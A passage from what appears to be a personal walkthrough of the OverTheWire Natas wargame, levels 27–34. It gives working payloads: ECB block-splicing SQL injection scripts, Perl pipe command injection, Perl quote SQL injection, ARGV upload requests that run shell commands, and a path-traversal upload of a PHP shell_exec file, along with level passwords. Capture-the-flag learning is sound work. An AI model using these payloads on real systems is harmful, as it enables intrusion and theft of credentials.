password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org"

for i in range(50, 62):
	r = requests.get(url + f"/search.php/?query={'a'*i}")
	pattern = "Incorrect amount of PKCS#7"
	print(r.text)
	if len(re.findall(pattern, r.text)) < 1:
		# print(r.text)
		print("i,," ,i)
		break
```

Last script to get url

```python
#!/usr/local/bin/python3

import requests, re, string
from urllib.parse import unquote
import base64
from math import ceil

user = "natas28"
password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org"

s = requests.session()
size = 16
SQLi = 'a'*9 + "' UNION SELECT password FROM users;#"

num_blocks = (len(SQLi) - 10) / size
if (len(SQLi) - 10) % size != 0:
	num_blocks = ceil(num_blocks)

result = s.post(url, data={"query": SQLi})
raw_payload = base64.b64decode(requests.utils.unquote(result.url[101:]))
result = s.post(url, data={"query": "a"*10})
original = base64.b64decode(requests.utils.unquote(result.url[101:]))

payload = original[:size*3] + raw_payload[size*3:size*3 + (num_blocks*size)] + original[size*3:]
print(payload)
encrypted_payload = requests.utils.quote(base64.b64encode(payload)).replace("/", "%2F")
print(encrypted_payload)
print(url + "/search.php/?query=%s" % encrypted_payload)
```

[check this for full explaination](https://www.youtube.com/watch?v=qpC2sNcRj5o) or [this](https://r00tblogger.wordpress.com/2019/01/29/overthewire-natas-wargame/)

### Password

airooCaiseiyee8he8xongien9euhe8b

---------

## Natas Level 28 → Level 29

Username: natas29
URL:      http://natas29.natas.labs.overthewire.org

### Approach

We may need to know perl hacking for this

trying perl 

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```
checking file
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00
```

getting password
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/*_webpass/nat*30%00
```

### Password for Level 29 - 30

wie9iexae0Daihohv8vuu3cei9wahf0e

## Natas Level 29 → Level 30

Username: natas30
URL:      http://natas30.natas.labs.overthewire.org

### Approach

trying perl quote sql injection , [check here](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection)

```python
#!/usr/local/bin/python3

import requests, re

user = "natas30"
password = "wie9iexae0Daihohv8vuu3cei9wahf0e"
url = f"http://{user}:{password}@{user}.natas.labs.overthewire.org/"

# r = requests.get(url)

payload = ["'lol' or 1", 4]

r = requests.post(url, data={"username": user, "password": payload})

print(r.text)
```

### Password for level 30 - 31

hay7aecuungiuKaezuathuk9biin0pu1

----------

## Natas Level 30 → Level 31

Username: natas31
URL:      http://natas31.natas.labs.overthewire.org

### Approach

uploaded normal file and it is displaying it as normal file

[upload for XSS in detail](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)

we need to add for perl upload ARGV exploit

```
------WebKitFormBoundaryDBr9t46Mz8hvq1tY
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
```

and also send command in request query

burp intercept request
```bash
POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 293
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
Upgrade-Insecure-Requests: 1
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDBr9t46Mz8hvq1tY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryDBr9t46Mz8hvq1tY
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundaryDBr9t46Mz8hvq1tY
Content-Disposition: form-data; name="file"; filename="demo.csv"
Content-Type: text/csv

Year,Make,Model
2999,Ford,e301
2182,lambor,gini

------WebKitFormBoundaryDBr9t46Mz8hvq1tY
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryDBr9t46Mz8hvq1tY--

```

### Password for level 31 - 32

no1vohsheCaiv3ieH4em1ahchisainge


----------

## Natas Level 31 → Level 32

Username: natas32
URL:      http://natas32.natas.labs.overthewire.org

### Approach

Need to execute file present in root directory 

First getting all files in root directory with burp repeater

```bash
POST /index.pl?ls%20/%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 452
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
Upgrade-Insecure-Requests: 1
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySs2vQc2igRVXF1qB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundarySs2vQc2igRVXF1qB
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundarySs2vQc2igRVXF1qB
Content-Disposition: form-data; name="file"; filename="demo.csv"
Content-Type: text/csv

Year,Make,Model
2999,Ford,e301
2182,lambor,gini

------WebKitFormBoundarySs2vQc2igRVXF1qB
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarySs2vQc2igRVXF1qB--

``` 

```bash
# Files in /
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
natas33
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

```bash
?pwd%20|
	/var/www/natas/natas32
?ls%20/var/www/natas/natas32%20|
	/var/www/natas/natas32:
		bootstrap-3.3.6-dist
		getpassword
		getpassword.c
		getpassword.c.tmpl
		index-source.html
		index-source.pl
		index.pl
		index.pl.tmpl
		jquery-1.12.3.min.js
		sorttable.js
		tmp
```

```bash
# Used for last level
?ls%20-al%20/var/www/natas/%20|
	41 root    root     4096 Dec 22 17:28 .
	 3 root    root     4096 Jan 29  2018 ..
	 5 root    root     4096 Oct 25  2018 main
	 2 natas0  natas0   4096 Dec 20  2016 natas0
	 2 natas1  natas1   4096 Dec 20  2016 natas1
	 2 natas10 natas10  4096 Dec 20  2016 natas10
	 2 natas11 natas11  4096 Dec 20  2016 natas11
	 4 natas12 natas12  4096 Dec 22 17:30 natas12
	 3 natas13 natas13  4096 Dec 29  2017 natas13
	 2 natas14 natas14  4096 Dec 20  2016 natas14
	 2 natas15 natas15  4096 Dec 20  2016 natas15
	 2 natas16 natas16  4096 Dec 20  2016 natas16
	 2 natas17 natas17  4096 Dec 20  2016 natas17
	 2 natas18 natas18  4096 Oct 25  2018 natas18
	 2 natas19 natas19  4096 Oct 25  2018 natas19
	 3 natas2  natas2   4096 Dec 20  2016 natas2
	 2 natas20 natas20  4096 Dec 20  2016 natas20
	 2 natas21 natas21  4096 Dec 20  2016 natas21
	 2 natas21 natas21  4096 Dec 20  2016 natas21-experimenter
	 2 natas22 natas22  4096 Dec 20  2016 natas22
	 2 natas23 natas23  4096 Dec 20  2016 natas23
	 2 natas24 natas24  4096 Mar 19  2018 natas24
	 4 natas25 natas25  4096 Dec 20  2016 natas25
	 3 natas26 natas26  4096 Dec 20  2016 natas26
	 2 natas27 natas27  4096 Mar 26  2018 natas27
	 2 natas28 natas28  4096 May  7  2020 natas28
	 2 natas29 natas29  4096 Nov  5  2017 natas29
	 3 natas3  natas3   4096 Dec 20  2016 natas3
	 2 natas30 natas30  4096 Oct 29  2018 natas30
	 4 natas31 natas31  4096 Dec 15  2016 natas31
	 4 natas32 natas32  4096 Dec 15  2016 natas32
	 2 natas33 natas33  4096 Oct 27  2018 natas33
	 3 natas33 natas33  4096 Jun  1 09:12 natas33-new
	 2 natas34 natas34  4096 Oct 27  2018 natas34
	 2 natas4  natas4   4096 Dec 20  2016 natas4
	 2 natas5  natas5   4096 Dec 20  2016 natas5
	 3 natas6  natas6   4096 Dec 20  2016 natas6
	 2 natas7  natas7   4096 Dec 20  2016 natas7
	 2 natas8  natas8   4096 Dec 20  2016 natas8
	 2 natas9  natas9   4096 Dec 20  2016 natas9
	 4 root    www-data 4096 Dec 20  2016 stats
```

Inside getpassword.c file `?/bin/cat%20/var/www/natas/natas32/getpassword.c%20|`
```c
#include &lt;stdio.h&gt;
int main(){
    int c;
    FILE *file;
    file = fopen(&quot;/etc/natas_webpass/natas33&quot;</td><td> &quot;r&quot;);
    if (file) {
        while ((c = getc(file)) != EOF)
            putchar(c);
        fclose(file);
    }
    return 0;
}
```
run getpassword file `?./getpassword%20|`

```
shoogeiGa2yee3de6Aex8uaXeech5eey
```

### Password for level 32 - 33

shoogeiGa2yee3de6Aex8uaXeech5eey

----------

## Natas Level 32 → Level 33

Username: natas33
URL:      http://natas33.natas.labs.overthewire.org

### Approach

source code is using session id as filename and creating hash of file which needs to be bypassed or replaced with our hash.

[Phar:// Deserialization for bypassing md5 check](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization) or [this for more detail about how to execute](https://www.youtube.com/watch?v=HaW15aMzBUM)

didn't understand much

[Other solution](https://www.reddit.com/r/securityCTF/comments/igyiht/natas33_alternate_solution/)

Upload file with name `../../var/www/natas/natas33-new/index.php`

for folder natas33 it says permission denied by from previous level when we check folder name then thier is one natas33-new

and by calling `http://natas33-new.natas.labs.overthewire.org/index.php` we will execute our php file

```php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

### Password for level 33 - 34

shu5ouSu6eicielahhae0mohd4ui5uig

----------

## Natas Level 33 → Level 34

Username: natas34
URL:      http://natas34.natas.labs.overthewire.org

```
Congratulations! You have reached the end... for now. 
```

------------------------------------------------------------------------
